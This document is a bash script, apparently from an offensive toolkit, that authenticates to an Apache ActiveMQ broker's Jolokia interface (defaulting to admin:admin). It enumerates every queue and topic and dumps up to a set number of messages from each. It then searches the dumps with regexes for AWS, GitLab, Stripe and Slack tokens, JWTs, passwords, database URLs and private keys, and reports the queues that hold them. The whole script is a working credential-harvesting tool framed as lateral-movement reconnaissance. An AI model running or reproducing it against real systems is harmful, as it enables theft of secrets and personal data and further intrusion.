#!/usr/bin/env bash
# activemq-queues.sh — lateral movement intel: read every queue/topic for sensitive data.
#
# Even without RCE, the queue contents themselves are often gold:
# inter-service JWTs, API tokens, user PII, internal hostnames, password reset
# emails in pending mail queues. This script enumerates and dumps messages.

set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$SCRIPT_DIR/_activemq_lib.sh"

TARGET=""
USER="admin"; PASS="admin"
OUT="./activemq-queues"
MAX_MSGS=50

while [ $# -gt 0 ]; do
    case "$1" in
        --target)    TARGET="$2"; shift 2 ;;
        --user)      USER="$2"; shift 2 ;;
        --pass)      PASS="$2"; shift 2 ;;
        --output|-o) OUT="$2"; shift 2 ;;
        --max-msgs)  MAX_MSGS="$2"; shift 2 ;;
        -h|--help)
            cat <<EOF
Usage: $0 --target host:port [--user U] [--pass P] [-o dir] [--max-msgs N]
  Reads up to --max-msgs messages from every queue and dumps them to disk.
  Searches dumped contents for credential patterns.
EOF
            exit 0 ;;
        *) err "unknown arg: $1"; exit 1 ;;
    esac
done

[ -z "$TARGET" ] && { err "--target required"; exit 1; }
parse_target "$TARGET"; [ -z "$PORT" ] && PORT=8161
mkdir -p "$OUT"

if ! jolokia_auth_works; then err "Jolokia auth failed for $USER:$PASS"; exit 2; fi
hit "Authed to $HOST:$PORT as $USER"

PARSER="$SCRIPT_DIR/jolokia_inventory.py"
log "Discovering broker object names"
curl -sk -m 8 -u "$USER:$PASS" "$(jolokia_url)/search/org.apache.activemq:type=Broker,brokerName=*" > "$OUT/brokers.json"
mapfile -t BROKERS < <(python3 "$PARSER" Broker "$OUT/brokers.json")
[ "${#BROKERS[@]}" -gt 0 ] || { err "no broker objects discovered"; exit 3; }

curl -sk -m 8 -u "$USER:$PASS" \
    "$(jolokia_url)/search/org.apache.activemq:type=Broker,brokerName=*,destinationType=Queue,destinationName=*" \
    > "$OUT/queues.json"
python3 "$PARSER" Queue "$OUT/queues.json" > "$OUT/queue-records.tsv"
curl -sk -m 8 -u "$USER:$PASS" \
    "$(jolokia_url)/search/org.apache.activemq:type=Broker,brokerName=*,destinationType=Topic,destinationName=*" \
    > "$OUT/topics.json"
python3 "$PARSER" Topic "$OUT/topics.json" > "$OUT/topic-records.tsv"
sort -u -o "$OUT/queue-records.tsv" "$OUT/queue-records.tsv"
sort -u -o "$OUT/topic-records.tsv" "$OUT/topic-records.tsv"
QCOUNT=$(awk 'NF{n++} END{print n+0}' "$OUT/queue-records.tsv")
TCOUNT=$(awk 'NF{n++} END{print n+0}' "$OUT/topic-records.tsv")
hit "$QCOUNT queues found across ${#BROKERS[@]} broker(s)"
hit "$TCOUNT topics found across ${#BROKERS[@]} broker(s)"

# 4. For each queue: stats + browse messages
mkdir -p "$OUT/queues"
while IFS=$'\t' read -r BROKER_NAME safe q object_path; do
    [ -z "$q" ] && continue
    qdir="$OUT/queues/$safe"
    mkdir -p "$qdir"

    # Stats
    curl -sk -m 5 -u "$USER:$PASS" \
        "$(jolokia_url)/read/$object_path" \
        > "$qdir/stats.json"

    # Browse up to MAX_MSGS messages. Jolokia's maxCollectionSize processing
    # option caps the returned message array server-side.
    curl -sk -m 15 -u "$USER:$PASS" \
        "$(jolokia_url)/exec/$object_path/browseMessages()?maxCollectionSize=$MAX_MSGS" \
        > "$qdir/messages.json"

    # Quick credential pattern search on the raw response
    if grep -oEi 'glpat-[A-Za-z0-9_-]{20,}|AKIA[0-9A-Z]{16}|sk_(test|live)_[A-Za-z0-9]{16,}|xox[bp]-[A-Za-z0-9-]{10,}|eyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]+|"password"\s*:\s*"[^"]{6,}|"token"\s*:\s*"[^"]{16,}|"api[_-]?key"\s*:\s*"[^"]{16,}|postgres://[^@]+:[^@]+@|BEGIN .*PRIVATE KEY' \
            "$qdir/messages.json" > "$qdir/_cred_matches.txt" 2>/dev/null
        then
        hit "  $q  credential pattern found — see $qdir/_cred_matches.txt"
        echo "$q" >> "$OUT/_queues_with_creds.txt"
    fi
done < "$OUT/queue-records.tsv"

# 5. Summary
log "Writing summary"
{
    echo "============================================================"
    echo "  ActiveMQ Lateral Intelligence"
    echo "  Brokers:  ${#BROKERS[@]} discovered structurally"
    echo "  Target:   $HOST:$PORT"
    echo "  Time:     $(date -Is)"
    echo "============================================================"
    echo
    echo "Queues : $QCOUNT"
    echo "Topics : $TCOUNT"
    echo
    if [ -s "$OUT/_queues_with_creds.txt" ]; then
        echo "Queues containing credential-shaped values:"
        sort -u "$OUT/_queues_with_creds.txt" | sed 's/^/  /'
    else
        echo "(no obvious credential patterns in sampled messages)"
    fi
    echo
    echo "Detailed files: $OUT/queues/<queueName>/"
} > "$OUT/SUMMARY.txt"
cat "$OUT/SUMMARY.txt"
